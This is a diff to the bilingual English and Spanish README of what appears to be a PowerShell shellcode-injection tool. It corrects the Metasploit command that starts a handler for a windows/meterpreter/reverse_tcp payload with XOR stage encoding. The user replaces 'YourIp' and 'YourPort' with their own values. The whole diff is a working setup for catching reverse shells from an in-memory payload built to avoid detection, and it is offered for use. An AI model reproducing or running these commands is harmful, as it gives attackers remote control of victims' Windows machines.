@@ -36,7 +36,7 @@ $t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400;  Start-Sle
 # Use #
 Start msfconsole with next command, replace "YourIp" and "YourPort" for your data
 ```
-msfconsole -x "set lhost YourIp; set lport YourPort; set payload windows/meterpreter/reverse_tcp; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; run"
+msfconsole -x "set lhost YourIp; set lport YourPort; use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; run"
 ```
 
 ## Spanish
@@ -65,7 +65,7 @@ $t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400;  Start-Sle
 # Uso #
 Inicia msfconsole con el siguiente comando, reemplaza "TuIp" y "TuPuerto" por tus datos respectivos
 ```
-msfconsole -x "set lhost TuIp; set lport TuPuerto; set payload windows/meterpreter/reverse_tcp; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; run"
+msfconsole -x "set lhost TuIp; set lport TuPuerto; use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; run"
 ```
 
 # Video Poc #
